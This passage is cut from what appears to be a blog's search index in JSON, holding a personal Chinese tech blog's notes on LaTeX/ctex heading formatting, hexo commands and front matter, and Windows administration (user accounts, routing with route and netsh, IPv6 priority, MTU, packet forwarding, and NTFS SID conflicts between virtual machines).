5.29 20 \u56db\u53f7 14 4.94 18.7 \u5c0f\u56db 12 4.23 16 \u4e94\u53f7 10.5 3.7 14 \u5c0f\u4e94 9 3.18 12 \u516d\u53f7 7.5 2.56 10 \u5c0f\u516d 6.5 2.29 8.7 \u4e03\u53f7 5.5 1.94 7.3 \u516b\u53f7 5 1.76 6.7","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#ctex","title":"ctex","text":"<pre><code>% \u7528 \\pkg{ctex} \u7684\u63a5\u53e3\u8bbe\u7f6e\u5168\u90e8\u7ae0\u8282\u6807\u9898\u683c\u5f0f\u3002\n\n% \u4e00\u7ea7\u6807\u9898\uff1a4 \u53f7\u9ed1\u4f53\uff0c\u6bb5\u524d 8 \u78c5\uff0c\u6bb5\u540e 8 \u78c5\u3002\n% \u4e00\u7ea7\u6807\u9898\uff1a5 \u53f7\u9ed1\u4f53\uff0c\u6bb5\u524d 8 \u78c5\uff0c\u6bb5\u540e 8 \u78c5\u3002\n\\ctexset{\n  section = {\n    format       = \\zihao{5},\n    nameformat   = \\heiti,\n    numberformat = \\bfseries,\n    titleformat  = \\heiti,\n    % fixskip = true,\n    beforeskip   = 8bp,\n    afterskip    = 8bp,\n    afterindent  = true,\n  },\n  %\n  % \u4e8c\u7ea7\u6807\u9898\uff1a5 \u53f7\u9ed1\u4f53\uff0c\u6bb5\u524d 0.25 \u884c\uff0c\u6bb5\u540e 0.25 \u884c\u3002\n  % \u4e8c\u7ea7\u6807\u9898\uff1a\u5c0f 5 \u53f7\u9ed1\u4f53\uff0c\u6bb5\u524d 0.25 \u884c\uff0c\u6bb5\u540e 0.25 \u884c\u3002\n  subsection = {\n    format       = \\zihao{-5},\n    nameformat   = \\heiti,\n    numberformat = \\bfseries,\n    titleformat  = \\heiti,\n    beforeskip   = 2.625bp,\n    afterskip    = 2.625bp,\n    afterindent  = true,\n  },\n  %\n  % \u4e09\u7ea7\u8282\u6807\u9898\uff1a5 \u53f7\u5b8b\u4f53\uff0c\u6bb5\u524d\u6bb5\u540e 0 \u78c5\u3002\n  subsubsection = {\n    format       = \\zihao{-5},\n    beforeskip   = \\z@,\n    afterskip    = \\z@,\n    afterindent  = true,\n  },\n  appendix = {\n    name = {\\appendixname\\space},\n  },\n}\n</code></pre>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/","title":"hexo \u4f7f\u7528","text":"<p>\u8bb0\u5f55 hexo \u76f8\u5173\u5185\u5bb9</p> <p>tag\uff1a\u5173\u952e\u8bcd categories:</p> <ul> <li>\u8f6f\u4ef6\u5de5\u5177\uff1a\u4ecb\u7ecd\u65b0\u53d1\u73b0\u7684\u597d\u7528\u5de5\u5177</li> <li>\u6298\u817e\uff1a\u505a\u7684\u4e00\u4ef6\u4e8b</li> <li>\u7f51\u7edc\uff1a\u8def\u7531\u5668\uff0copenwrt\uff0c\u8f6f\u8def\u7531</li> </ul>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5f00\u59cb\u6559\u7a0b-start-guide","title":"\u5f00\u59cb\u6559\u7a0b (start guide)","text":"","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>TODO</p>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u57fa\u672c\u547d\u4ee4","title":"\u57fa\u672c\u547d\u4ee4","text":"<p>\u547d\u4ee4\u5217\u8868</p> <pre><code>hexo new [layout] &lt;title&gt;\n\nhexo server -p 5000\nhexo server -i 192.168.1.1 # \u9ed8\u8ba4\u7ed1\u5b9a0.0.0.0\n\nhexo generate\nhexo generate --deploy  #\u6216\u8005 hexo deploy --generate\n\nhexo deploy\n</code></pre>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u521b\u5efa\u65b0\u6587\u6863","title":"\u521b\u5efa\u65b0\u6587\u6863","text":"<pre><code>hexo new [layout] &lt;title&gt;\n</code></pre> <ul> <li>layout \u53ef\u4ee5\u7406\u89e3\u4e3a\u6a21\u677f\uff0c\u521b\u5efa\u65f6\u4f7f\u7528<code>scaffolds</code>\u76ee\u5f55\u4e0b\u5bf9\u5e94\u540d\u79f0 md \u6587\u4ef6\u521b\u5efa\u65b0\u6587\u6863\u3002</li> <li>\u9ed8\u8ba4\u6709\u4e09\u79cd layout\uff1apost, draft, page</li> <li>\u9ed8\u8ba4 layout \u4e3a<code>post</code>\uff0c\u6587\u4ef6\u540d\u683c\u5f0f\u5728 config \u6587\u4ef6\u4e2d<code>new_post_name</code>\u6307\u5b9a</li> </ul>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u4e66\u5199","title":"\u4e66\u5199","text":"","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5934\u90e8\u5143\u6570\u636e","title":"\u5934\u90e8\u5143\u6570\u636e","text":"<p>front-matter \u4e3a\u6587\u672c\u5934\u90e8\u5143\u7d20\u636e\uff0c\u4f7f\u7528 yaml \u6216 json \u683c\u5f0f\u3002</p> <p>\u5e38\u7528\u8bbe\u7f6e\uff1a</p> <ul> <li>title</li> <li>date: \u6587\u4ef6\u521b\u5efa\u65e5\u671f</li> <li>updated: \u6587\u4ef6\u66f4\u65b0\u65e5\u671f</li> <li>tags, categories: \u5bf9\u4e8e<code>page</code>\u65e0\u6548<ul> <li>\u591a\u4e2a tag \u8868\u793a\u65b9\u6cd5</li> </ul> </li> </ul> <pre><code>tags:\n- openwrt\n- vlan\n- \u8f6f\u8def\u7531\n</code></pre>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5982\u4f55\u63d0\u4f9b\u9759\u6001\u8d44\u6e90","title":"\u5982\u4f55\u63d0\u4f9b\u9759\u6001\u8d44\u6e90","text":"<ul> <li>\u53ef\u4ee5\u5c06\u56fe\u7247\u3001css\u3001\u4ee3\u7801\u6587\u4ef6\u7b49\u9759\u6001\u8d44\u6e90\u653e\u5728<code>source/</code>\u76ee\u5f55\u4e0b\u3002\u5982\uff1a\u4e00\u79cd\u663e\u793a\u56fe\u7247\u65b9\u5f0f\u4e3a\uff0c\u5c06\u56fe\u7247\u653e\u5728<code>source/images</code>\u76ee\u5f55\uff0c\u7136\u540e\u901a\u8fc7<code>![](../../images/image.jpg)</code>\u663e\u793a\uff08\u6ce8\u610f\u9700\u8981\u6839\u8def\u5f84\uff09\u3002</li> <li>\u4e5f\u53ef\u4ee5\u5f00\u542f<code>post_asset_folder: true</code>\uff0c\u6bcf\u6b21\u521b\u5efa post \u65f6\uff0c\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94 asset \u76ee\u5f55\u3002\u4e0d\u8fc7\u6211\u56fe\u7247\u4f7f\u7528\u56fe\u5e8a\uff0c\u56e0\u6b64\u57fa\u672c\u7528\u4e0d\u4e0a\u3002</li> </ul>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5982\u4f55\u5f15\u7528\u5176\u5b83-post","title":"\u5982\u4f55\u5f15\u7528\u5176\u5b83 post","text":"<p>\u7531\u4e8e hexo \u652f\u6301 markdown, jsp \u7b49\u591a\u79cd\u6587\u6863\u683c\u5f0f\u3002\u4e3a\u4e86\u652f\u6301\u7edf\u4e00\u7684\u7279\u6027\uff0c\u5f15\u5165\u4e86 Tag plugin\uff08\u975e post tag \u542b\u4e49\uff09\uff0c\u652f\u6301\u5e38\u89c1\u7684\u6392\u7248\u683c\u5f0f\uff0c\u5982\u5757\u5f15\u7528\u3001\u4ee3\u7801\u5757\u3001Youtube \u89c6\u9891\u7b49\u3002</p> <p>\u94fe\u63a5\u5230\u5176\u5b83\u6587\u7ae0\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>{% post_path filename %}  \n{% post_link filename [title] [escape] %}\n</code></pre>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#tag-\u548c-categories","title":"tag \u548c categories","text":"","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5f00\u542f","title":"\u5f00\u542f","text":"<ol> <li> <p>\u521b\u5efa page   \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0chexo \u4f1a\u521b\u5efa<code>source/tags</code>\u548c<code>source/categories</code>\u4e24\u4e2a\u76ee\u5f55</p> <pre><code>hexo new page categories  \nhexo new page tags\n</code></pre> <p>\u4fee\u6539\u5176\u4e2d index.md \u6587\u4ef6\uff0c\u6bd4\u5982\u5bf9\u4e8e tag</p> <pre><code>---\ntitle: \u6807\u7b7e  \ndate: 2018-10-10 12:21:48  \ntype: \"tags\"  \n---\n</code></pre> </li> <li> <p>\u8bbe\u7f6e<code>_config.yaml</code>\u4e2d\u76ee\u5f55</p> <pre><code>tag_dir: tags\ncategory_dir: categories\n</code></pre> </li> <li> <p>\u8bbe\u7f6e\u4e3b\u9898<code>_config.yaml</code>\u4e2d\u8bbe\u7f6e</p> <p><code>yaml menu: \u00a0 home: / || home \u00a0 #about: /about/ || user \u00a0 tags: [/tags/ || tags] \u00a0 categories: /categories/ || th</code></p> </li> </ol>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u591a\u4e2a-tag","title":"\u591a\u4e2a tag","text":"<pre><code>tags: [ ]\n- PS5\n- Switch\n- Xbox S\n</code></pre>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u591a\u4e2a-category","title":"\u591a\u4e2a category","text":"<p>hexo \u9ed8\u8ba4\u540c\u7ea7 category \u53ea\u80fd\u6709\u4e00\u4e2a</p> <p>\u5982\u679c\u60a8\u6709\u8fc7\u4f7f\u7528 WordPress \u7684\u7ecf\u9a8c\uff0c\u5c31\u5f88\u5bb9\u6613\u8bef\u89e3 Hexo \u7684\u5206\u7c7b\u65b9\u5f0f\u3002WordPress \u652f\u6301\u5bf9\u4e00\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u591a\u4e2a\u5206\u7c7b\uff0c\u800c\u4e14\u8fd9\u4e9b\u5206\u7c7b\u53ef\u4ee5\u662f\u540c\u7ea7\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u7236\u5b50\u5206\u7c7b\u3002\u4f46\u662f Hexo \u4e0d\u652f\u6301\u6307\u5b9a\u591a\u4e2a\u540c\u7ea7\u5206\u7c7b</p> <p>\u5982\u4e0b\u8bbe\u7f6e\u4f1a\u5bfc\u81f4 Life \u4f4d\u4e8e Diary \u7ea7\u522b\u4e0b\u9762</p> <pre><code>categories:  \n  - Diary  \n  - Life\n</code></pre> <p>\u9700\u8981\u5982\u4e0b\u8bbe\u7f6e</p> <pre><code>- [Diary, PlayStation]  \n- [Diary, Games]  \n- [Life]\n</code></pre> <p>\u6b64\u65f6\u8fd9\u7bc7\u6587\u7ae0\u540c\u65f6\u5305\u62ec\u4e09\u4e2a\u5206\u7c7b\uff1a\u00a0<code>PlayStation</code>\u00a0\u548c\u00a0<code>Games</code>\u00a0\u5206\u522b\u90fd\u662f\u7236\u5206\u7c7b\u00a0<code>Diary</code>\u00a0\u7684\u5b50\u5206\u7c7b\uff0c\u540c\u65f6\u00a0<code>Life</code>\u00a0\u662f\u4e00\u4e2a\u6ca1\u6709\u5b50\u5206\u7c7b\u7684\u5206\u7c7b\u3002</p>","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5b9a\u5236","title":"\u5b9a\u5236","text":"","tags":["hexo"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/","title":"windows \u76f8\u5173","text":"<p>windows \u76f8\u5173</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7cfb\u7edf\u7ef4\u62a4","title":"\u7cfb\u7edf\u7ef4\u62a4","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7528\u6237","title":"\u7528\u6237","text":"<p>\u67e5\u770b\u7528\u6237</p> <pre><code>C:\\Windows\\System32&gt;net user\n\n\\\\S3-PRO \u7684\u7528\u6237\u5e10\u6237\n\n-------------------------------------------------------------------------------\n15440                    Administrator            DefaultAccount\nGuest                    joker                    WDAGUtilityAccount\nyfy\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre> <p>\u542f\u7528\u7528\u6237</p> <pre><code>net user Administrator /active:yes  # \u542f\u52a8Administrator\u7528\u6237\nnet user Administrator password  # \u8bbe\u7f6e\u7528\u6237\u5bc6\u7801\n</code></pre> <p>\u5168\u90e8\u547d\u4ee4</p> <pre><code>NET USER\n[username [password | *] [options]] [/DOMAIN]\n         username {password | *} /ADD [options] [/DOMAIN]\n         username [/DELETE] [/DOMAIN]\n         username [/TIMES:{times | ALL}]\n         username [/ACTIVE: {YES | NO}]\n</code></pre> <p>\u6dfb\u52a0\u7528\u6237</p> <pre><code>net user &lt;user_name&gt; &lt;passwd&gt; /add\n</code></pre> <p>\u8bbe\u7f6e\u6743\u9650</p> <pre><code>net localgroup administrators [username] /add\n</code></pre> <p>How to Create an Admin User Account Using CMD Prompt (Windows) \u00ab Operating Systems :: WonderHowTo</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668","title":"\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668","text":"<p>win11-home \u6ca1\u6709\uff0c\u9700\u8981\u81ea\u5df1\u5b89\u88c5</p> <pre><code>gpedit.msc\n</code></pre> <p>\u8ba1\u7b97\u673a\u914d\u7f6e-windows \u8bbe\u7f6e - \u5b89\u5168\u8bbe\u7f6e - \u672c\u5730\u7b56\u7565</p> <ul> <li>\u7528\u6237\u6743\u9650\u5206\u914d<ul> <li>\u62d2\u7edd\u672c\u5730\u767b\u5f55</li> <li>\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u8fd9\u53f0\u8ba1\u7b97\u673a</li> <li>\u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55</li> </ul> </li> <li>\u5b89\u5168\u9009\u9879<ul> <li>\u8d26\u6237\uff1a\u7ba1\u7406\u5458\u8d26\u6237\u72b6\u6001\u3002\uff08\u5373 Administrator \u662f\u5426\u53ef\u89c1\uff09</li> </ul> </li> </ul>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u8def\u7531\u8868","title":"\u8def\u7531\u8868","text":"<pre><code>route print -6\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u67e5\u770b-neigh","title":"\u67e5\u770b neigh","text":"<pre><code>netsh interface ipv6 show neighbors\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4fee\u6539\u8def\u7531","title":"\u4fee\u6539\u8def\u7531","text":"<pre><code>ROUTE [-f] [-p] [-4|-6] command [destination]\n                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]\n\nroute print -4\nroute CHANGE 0.0.0.0 MASK 0.0.0.0 192.168.1.1 METRIC 30 IF 17 # IF \u4ece print \u4e2d\u83b7\u5f97\n\nroute ADD 192.168.1.0 MASK 255.255.255.0 192.168.1.1 METRIC 1 IF 4\nroute ADD 36.159.239.60/24 10.3.100.1 METRIC 1 IF 3\n\nroute delete 0.0.0.0/0 if 16\n</code></pre> <p>\u4f7f\u7528 netsh \u4e5f\u53ef\u4ee5 <pre><code>netsh interface ipv6 add route ::/0 46 fe80::2ad1:27ff:fec0:166c\n\nroute delete ::/0\n</code></pre></p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4fee\u6539-ipv6ipv4-\u4f18\u5148\u7ea7","title":"\u4fee\u6539 ipv6\uff0cipv4 \u4f18\u5148\u7ea7","text":"<p>Windows10 \u8bbe\u7f6e IPv4/v6 \u8bbf\u95ee\u4f18\u5148\u7ea7 | IP \u67e5\u8be2 (ipw.cn)</p> <p>IPv6(<code>::/0</code>) \u00a0IPv4(<code>::ffff:0:0/96</code>)</p> <pre><code>C:\\Users\\yfy&gt;netsh interface ipv6 show prefixpolicies\n\u67e5\u8be2\u6d3b\u52a8\u72b6\u6001...\n\n\u4f18\u5148\u987a\u5e8f    \u6807\u7b7e   \u524d\u7f00\n----------  -----  --------------------------------\n        50      0  ::1/128\n        40      1  ::/0\n        35      4  ::ffff:0:0/96\n        30      2  2002::/16\n         5      5  2001::/32\n         3     13  fc00::/7\n         1     11  fec0::/10\n         1     12  3ffe::/16\n         1      3  ::/96\n\n# \u5c06::ffff:0:0/96\u8bbe\u7f6e\u5230::/0\u524d\u9762\u5373\u53ef\nnetsh interface ipv6 set prefixpolicy ::ffff:0:0/96 100 4\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u67e5\u770b\u8bbe\u7f6e-mtu","title":"\u67e5\u770b\u8bbe\u7f6e MTU","text":"<pre><code>netsh interface ipv4 show subinterfaces\n\nnetsh interface ipv4 set subinterface \"\u4ee5\u592a\u7f51 2\" mtu=1500 store=persistent\n</code></pre> <p>\u67e5\u770b PMTU</p> <pre><code>netsh interface ipv4 show destinationcache\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5f00\u542f-forwarding","title":"\u5f00\u542f Forwarding","text":"<pre><code>Set-NetIPInterface -ifindex 4 -Forwarding Enabled\n</code></pre> <p>wireshard \u80fd\u6293\u5230\u4ece\u4ee5\u592a\u7f51\u6765\u7684 192.168.1.1 -&gt; 223.5.5.5 \u7684\u5305\uff0c\u4f46\u662f windows \u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u8f6c\u53d1\u3002</p> <p>windows \u5f00\u542f\u8f6c\u53d1\uff1aHow can I enable packet forwarding on Windows? - Server Fault</p> <ul> <li>\u4e24\u79cd\u65b9\u6cd5\u3002\u7b2c\u4e00\u79cd\u65b9\u6cd5\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u9700\u8981\u91cd\u542f</li> <li>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u4f7f\u7528 powershell\uff0c\u4e0d\u9700\u8981\u91cd\u542f\uff0c\u53ef\u4ee5\u4fee\u6539\u6307\u5b9a\u63a5\u53e3 <pre><code># \u83b7\u5f97\u63a5\u53e3\u5217\u8868\nGet-NetIPInterface | select ifIndex,InterfaceAlias,AddressFamily,ConnectionState,Forwarding | Sort-Object -Property IfIndex | Format-Table\n\n# \u5f00\u542f\u6307\u5b9a\u63a5\u53e3\uff08\u4ece\u8fd9\u4e2a\u63a5\u53e3\u8fdb\u6765\u7684\u6d41\u91cf\u5141\u8bb8\u8f6c\u53d1\uff09\nSet-NetIPInterface -ifindex &lt;required interface index from table&gt; -Forwarding Enabled\n# \u5f00\u542f\u6240\u6709\u63a5\u53e3\nSet-NetIPInterface -Forwarding Enabled\n\n# \u7981\u7528\u6240\u6709\u63a5\u53e3\nSet-NetIPInterface -Forwarding Disabled\n\n# \u5982\u679c\u4e0d\u884c\u7684\u8bdd\uff0c\u770b\u4e0b **Routing and Remote Access service** \u662f\u5426\u5f00\u542f\u4e86\nSet-Service RemoteAccess -StartupType Automatic; Start-Service RemoteAccess\n</code></pre></li> </ul> <p>\u8bbe\u7f6e\u8f6c\u53d1\u540e\uff0c\u4f7f\u7528 wireguard \u8fd8\u9700\u8981 masquerade</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u76d1\u542c\u7684\u7aef\u53e3","title":"\u76d1\u542c\u7684\u7aef\u53e3","text":"<pre><code>netstat -ano |findstr \n</code></pre> <pre><code>-a            \u663e\u793a\u6240\u6709\u8fde\u63a5\u548c\u4fa6\u542c\u7aef\u53e3\u3002\u4e0d\u6307\u5b9a\u5219\u53ea\u663e\u793a\u8fde\u63a5\n  -n            \u4ee5\u6570\u5b57\u5f62\u5f0f\u663e\u793a\u5730\u5740\u548c\u7aef\u53e3\u53f7\u3002\n  -o            \u663e\u793a\u62e5\u6709\u7684\u4e0e\u6bcf\u4e2a\u8fde\u63a5\u5173\u8054\u7684\u8fdb\u7a0b ID\u3002\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#sid","title":"SID","text":"<p>\u4e24\u4e2a windows \u865a\u62df\u673a\uff0c\u5171\u7528\u4e00\u4e2a windows \u865a\u62df\u78c1\u76d8\u3002\u5982\u4f55\u907f\u514d NTFS \u7528\u6237 id \u4e0d\u540c\u5bfc\u81f4\u7684\u6743\u9650\u51b2\u7a81\uff1f</p> <p>\u65b9\u6848\u6765\u81ea Chatgpt-4o (2024/5/18)</p> <ol> <li>\u4f7f\u7528\u76f8\u540c\u7684\u57df\u7528\u6237\uff1a\u5982\u679c\u865a\u62df\u673a\u52a0\u5165\u540c\u4e00\u4e2a\u57df\uff0c\u53ef\u4ee5\u4f7f\u7528\u57df\u7528\u6237\u6765\u8bbf\u95ee\u5171\u4eab\u78c1\u76d8\u3002\u8fd9\u79cd\u65b9\u5f0f\u786e\u4fdd\u4e24\u4e2a\u865a\u62df\u673a\u4e0a\u7684\u7528\u6237\u5177\u6709\u76f8\u540c\u7684 SID\u3002<ul> <li>\u6ca1\u7528\u8fc7\u57df\u7ba1\u7406</li> </ul> </li> <li>\u624b\u52a8\u5bf9\u9f50 SID\uff1a\u4f7f\u7528\u5de5\u5177\u624b\u52a8\u5bf9\u9f50\u4e24\u4e2a\u865a\u62df\u673a\u4e0a\u7684\u7528\u6237 SID\u3002\u8fd9\u79cd\u65b9\u6cd5\u6bd4\u8f83\u590d\u6742\uff0c\u4e00\u822c\u4e0d\u63a8\u8350\uff0c\u4f46\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u53ef\u4ee5\u89e3\u51b3\u95ee\u9898\u3002<ul> <li>\u63d0\u5230\u7684 NewSID \u5de5\u5177\u65e9\u5c31\u4e0d\u66f4\u65b0\u4e86\u3002\u5e76\u4e14\u5b9e\u73b0\u539f\u7406\u662f\u67e5\u627e\u5e76\u4fee\u6539\u6240\u6709\u65e7 SID \u7684\u8868\u9879\uff0c\u56e0\u6b64\u5e76\u4e0d\u77e5\u9053\u4f1a\u4e0d\u4f1a\u5bfc\u81f4\u5176\u5b83\u95ee\u9898\u3002</li> <li>NewSID - Sysinternals | Microsoft Learn</li> </ul> </li> <li>\u5171\u4eab\u76ee\u5f55\u7684\u6743\u9650\u914d\u7f6e\uff1a\u5bf9\u5171\u4eab\u78c1\u76d8\u4e0a\u7684\u76ee\u5f55\u8bbe\u7f6e\u66f4\u5bbd\u677e\u7684\u6743\u9650\uff0c\u4ee5\u907f\u514d\u6743\u9650\u51b2\u7a81\u3002<ul> <li>\u6728\u533e\u91c7\u7528\u7684\u65b9\u6848\u3002\u5c06\u6240\u6709\u76d8\u90fd\u8bbe\u7f6e\u6210 Everyone \u5b8c\u5168\u63a7\u5236\u3002\u7531\u4e8e\u6743\u9650\u662f\u7ee7\u627f\u7684\uff0c\u56e0\u6b64\u65b0\u521b\u5efa\u7684\u6587\u4ef6\u4e5f\u662f\u8be5\u6743\u9650\u3002</li> </ul> </li> <li>\u6620\u5c04\u7f51\u7edc\u9a71\u52a8\u5668\uff1a\u901a\u8fc7\u7f51\u7edc\u5171\u4eab\u65b9\u5f0f\u8bbf\u95ee\u865a\u62df\u78c1\u76d8\uff0c\u53ef\u4ee5\u907f\u514d\u76f4\u63a5\u7684 NTFS \u6743\u9650\u95ee\u9898\u3002</li> </ol> <p>\u7efc\u5408\u4e0b\u6765\u8fd8\u662f\u8bbe\u7f6e\u66f4\u5bbd\u677e\u7684\u6743\u9650\u65b9\u6848\u9002\u7528\u6027\u548c\u517c\u5bb9\u6027\u6bd4\u8f83\u597d\u3002</p> <ul> <li>\u5df2\u77e5\u95ee\u9898\uff1aEveryone \u6743\u9650\u914d\u7f6e\u540e\uff0czotero \u4ecd\u7136\u65e0\u6cd5\u6253\u5f00\u6570\u636e\u5e93\u3002</li> </ul> <p>sid \u8bb0\u5f55</p> <p>win11</p> <pre><code>PS C:\\Users\\yfy&gt; wmic useraccount\nAccountType  Caption                       Description                                                     Disabled  Domain     FullName  InstallDate  LocalAccount  Lockout  Name                PasswordChangeable  PasswordExpires  PasswordRequired  SID                                             SIDType  Status\n512          KVM-WIN11\\Administrator       \u7ba1\u7406\u8ba1\u7b97\u673a(\u57df)\u7684\u5185\u7f6e\u5e10\u6237                                        TRUE      KVM-WIN11                         TRUE          FALSE    Administrator       TRUE                FALSE            TRUE              S-1-5-21-1067228247-3673862886-1967894714-500   1        Degraded\n512          KVM-WIN11\\DefaultAccount      \u7cfb\u7edf\u7ba1\u7406\u7684\u7528\u6237\u5e10\u6237\u3002                                            TRUE      KVM-WIN11                         TRUE          FALSE    DefaultAccount      TRUE                FALSE            FALSE             S-1-5-21-1067228247-3673862886-1967894714-503   1        Degraded\n512          KVM-WIN11\\Guest               \u4f9b\u6765\u5bbe\u8bbf\u95ee\u8ba1\u7b97\u673a\u6216\u8bbf\u95ee\u57df\u7684\u5185\u7f6e\u5e10\u6237                              TRUE      KVM-WIN11                         TRUE          FALSE    Guest               FALSE               FALSE            FALSE             S-1-5-21-1067228247-3673862886-1967894714-501   1        Degraded\n512          KVM-WIN11\\WDAGUtilityAccount  \u7cfb\u7edf\u4e3a Windows Defender \u5e94\u7528\u7a0b\u5e8f\u9632\u62a4\u65b9\u6848\u7ba1\u7406\u548c\u4f7f\u7528\u7684\u7528\u6237\u5e10\u6237\u3002  TRUE      KVM-WIN11                         TRUE          FALSE    WDAGUtilityAccount  TRUE                TRUE             TRUE              S-1-5-21-1067228247-3673862886-1967894714-504   1        Degraded\n512          KVM-WIN11\\yfy                                                                                 FALSE     KVM-WIN11                         TRUE          FALSE    yfy                 TRUE                FALSE            FALSE             S-1-5-21-1067228247-3673862886-1967894714-1001  1        OK\n\nPS C:\\Users\\yfy&gt;\n</code></pre> <p>win10</p> <pre><code>yfy@kvm-win10 UCRT64 ~\n$ wmic useraccount\nAccountType  Caption                       Description                                                     Disabled  Domain     FullName  InstallDate  LocalAccount  Lockout  Name                PasswordChangeable  PasswordExpires  PasswordRequired  SID                                             SIDType  Status\n512          KVM-WIN10\\Administrator       \u7ba1\u7406\u8ba1\u7b97\u673a(\u57df)\u7684\u5185\u7f6e\u5e10\u6237                                        TRUE      KVM-WIN10                         TRUE          FALSE    Administrator       TRUE                FALSE            TRUE              S-1-5-21-3936709377-1542623274-3346462912-500   1        Degraded\n512          